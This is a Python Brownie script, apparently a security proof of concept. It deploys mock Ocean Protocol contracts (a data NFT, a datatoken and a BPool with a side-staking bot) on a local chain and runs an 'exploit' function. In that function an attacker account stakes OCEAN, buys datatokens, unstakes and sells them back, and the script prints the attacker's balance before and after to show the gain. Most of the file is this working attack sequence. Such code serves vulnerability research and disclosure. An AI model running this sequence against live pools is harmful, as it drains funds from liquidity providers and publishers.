import brownie

from brownie import (
    interface,
    MockOcean,
    ERC721Template,
    ERC20Template,
    BPool,
    FactoryRouter,
    ERC721Factory,
    SideStaking,
    ZERO_ADDRESS,
)

from scripts.utils import (
    DEPLOYER,
    FEE_COLLECTOR,
    PUBLISHER,
    ATTACKER,
    fromBase18,
    toBase18,
)


def main():
    ocean_token, router = deployment_setup()

    datatoken, pool = pool_setup(
        ocean_token,
        router,
        initial_ocean_liquidity=100_000,
        initial_datatoken_price=10,
        from_account=PUBLISHER,
    )

    attacker_ocean_balance_before = ocean_token.balanceOf(ATTACKER.address)
    exploit(pool, 50_000, 3000)
    attacker_ocean_balance_after = ocean_token.balanceOf(ATTACKER.address)

    print(
        f"Attacker ocean balance before attack {fromBase18(attacker_ocean_balance_before)}"
    )
    print(
        f"Attacker ocean balance after attack {fromBase18(attacker_ocean_balance_after)}"
    )
    return ocean_token, pool, datatoken


def exploit(pool, amount_stake, amount_buy, from_account=ATTACKER):
    # get datatoken and base token - ocean from pool
    datatoken_address = pool.getDatatokenAddress()
    datatoken = ERC20Template.at(datatoken_address)
    ocean_token_address = pool.getBaseTokenAddress()
    ocean_token = interface.IERC20(ocean_token_address)

    # pool swap fee info
    swapFee = pool.getSwapFee()

    # ATTACKER stake
    ocean_token.approve(pool.address, toBase18(1_000_000), {"from": from_account})
    pool.joinswapExternAmountIn(toBase18(amount_stake), 0, {"from": from_account})

    # ATTACKER buy datatoken
    maxAmountIn_base = toBase18(1_000_000)
    tokenAmountOut_base = toBase18(amount_buy)
    maxPrice_base = 2**255

    tokenInOutMarket = [
        ocean_token_address,
        datatoken.address,
        FEE_COLLECTOR.address,
    ]
    amountsInOutMaxFee = [
        maxAmountIn_base,
        tokenAmountOut_base,
        maxPrice_base,
        0,
    ]
    pool.swapExactAmountOut(
        tokenInOutMarket, amountsInOutMaxFee, {"from": from_account}
    )

    # ATTACKER unstake
    BPT_unstake = pool.balanceOf(from_account.address)
    poolAmountIn_base = BPT_unstake
    minAmountOut_base = toBase18(0.0)
    pool.exitswapPoolAmountIn(
        poolAmountIn_base,
        minAmountOut_base,
        {"from": from_account},
    )

    # ATTACKER sell datatoken
    datatoken_sell_amt = datatoken.balanceOf(from_account.address)
    datatoken.approve(pool.address, datatoken_sell_amt, {"from": from_account})

    tokenAmountIn_base = datatoken_sell_amt  # ""
    minAmountOut_base = toBase18(0)  # ""
    maxPrice_base = 2**255  # limit by min_OCEAN_amt, not price

    tokenInOutMarket = [datatoken_address, ocean_token_address, FEE_COLLECTOR.address]
    amountsInOutMaxFee = [
        tokenAmountIn_base,
        minAmountOut_base,
        maxPrice_base,
        swapFee,
    ]
    pool.swapExactAmountIn(
        tokenInOutMarket,
        amountsInOutMaxFee,
        {"from": from_account},
    )


def deployment_setup():
    brownie.chain.reset()

    # DEPLOYER deploys fake OCEAN token
    ocean_token = MockOcean.deploy(DEPLOYER.address, {"from": DEPLOYER})
    ocean_token.transfer(PUBLISHER.address, 1e24, {"from": DEPLOYER})
    ocean_token.transfer(ATTACKER.address, 1e24, {"from": DEPLOYER})

    # DEPLOYER deploys templates
    erc721_template = ERC721Template.deploy({"from": DEPLOYER})
    erc20_template = ERC20Template.deploy({"from": DEPLOYER})
    pool_template = BPool.deploy({"from": DEPLOYER})

    # DEPLOYER deploys Factory Router
    router = FactoryRouter.deploy(
        DEPLOYER.address,
        ocean_token.address,
        pool_template.address,
        FEE_COLLECTOR.address,
        [],
        {"from": DEPLOYER},
    )

    # DEPLOYER deploys ERC721 Factory
    erc721_factory = ERC721Factory.deploy(
        erc721_template.address,
        erc20_template.address,
        router.address,
        {"from": DEPLOYER},
    )
    # DEPLOYER deploys 1-sided staking bot
    ss_bot = SideStaking.deploy(router.address, {"from": DEPLOYER})
    router.addSSContract(ss_bot.address, {"from": DEPLOYER})
    router.addFactory(erc721_factory.address, {"from": DEPLOYER})

    return ocean_token, router


def pool_setup(
    ocean_token, router, initial_ocean_liquidity, initial_datatoken_price, from_account
):
    # Get contracts addresses from router
    erc721_factory_address = router.factory()
    erc721_factory = ERC721Factory.at(erc721_factory_address)

    ss_bot_address = router.ssContracts(0)
    ss_bot = SideStaking.at(ss_bot_address)

    pool_template_address = router.poolTemplates(0)
    pool_template = BPool.at(pool_template_address)

    # PUBLISHER creates ERC721 data NFT
    tx = erc721_factory.deployERC721Contract(
        "dataNFT",
        "DATANFT",
        1,
        ZERO_ADDRESS,
        ZERO_ADDRESS,
        "https://mystorage.com/mytoken.png",
        True,
        from_account.address,
        {"from": from_account},
    )
    datanft_address = tx.events["NFTCreated"]["newTokenAddress"]
    datanft = ERC721Template.at(datanft_address)

    # PUBLISHER creates ERC20 datatoken
    strings = ["datatoken", "datatoken"]
    datatoken_cap = 10000
    uints = [toBase18(datatoken_cap), toBase18(0.0)]
    addresses = [from_account.address] * 4
    _bytes = []
    tx = datanft.createERC20(
        1, strings, addresses, uints, _bytes, {"from": from_account}
    )

    datatoken_address = tx.events["TokenCreated"]["newTokenAddress"]
    datatoken = ERC20Template.at(datatoken_address)

    # PUBLISHER approves staking OCEAN
    ocean_token.approve(
        router.address, toBase18(initial_ocean_liquidity), {"from": from_account}
    )

    # PUBLISHER deploys pool, which includes a 1-sided staking bot
    ss_params = [
        toBase18(1 / initial_datatoken_price),  # rate (wei)
        18,  # OCEAN decimals
        toBase18(0.05 * datatoken_cap),  # vesting amount (wei)
        int(2.5e6),  # vested blocks
        toBase18(initial_ocean_liquidity),
    ]
    swap_fees = [
        toBase18(0.02),  # LP swap fee
        toBase18(0.01),  # mkt swap fee
    ]
    addresses = [
        ss_bot.address,
        ocean_token.address,
        from_account.address,
        from_account.address,
        FEE_COLLECTOR.address,
        pool_template.address,
    ]

    tx = datatoken.deployPool(ss_params, swap_fees, addresses, {"from": from_account})
    pool_address = tx.events["NewPool"]["poolAddress"]
    pool = BPool.at(pool_address)
    return datatoken, pool
